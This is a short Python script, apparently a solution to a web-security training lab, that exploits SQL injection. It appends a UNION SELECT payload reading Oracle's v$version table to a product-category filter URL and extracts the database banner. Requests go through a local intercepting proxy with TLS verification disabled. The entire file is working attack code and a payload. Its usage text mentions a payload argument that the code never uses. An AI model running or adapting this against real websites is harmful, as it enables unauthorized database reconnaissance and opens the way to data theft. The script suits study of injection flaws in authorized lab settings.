#!/usr/bin/python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080'
}

def exploit_sqli_version(url):
    path = "filter?category=Pets"
    sql_payload = "' UNION SELECT NULL, banner from v$version--"
    r = requests.get(url + path + sql_payload , verify=False, proxies=proxies)
    res = r.text
    if "Oracle Database" in res:
        print("[+] Found the database version.")
        soup = BeautifulSoup(res,'html.parser')
        version = soup.find(text=re.compile('.*Oracle\sDatabase.*'))
        print("[+] The Oracle Database version is: " + version)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1==1"' % sys.argv[0])
        sys.exit(-1)
    
    print("[+] Dumping the Version of the database...")

    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version")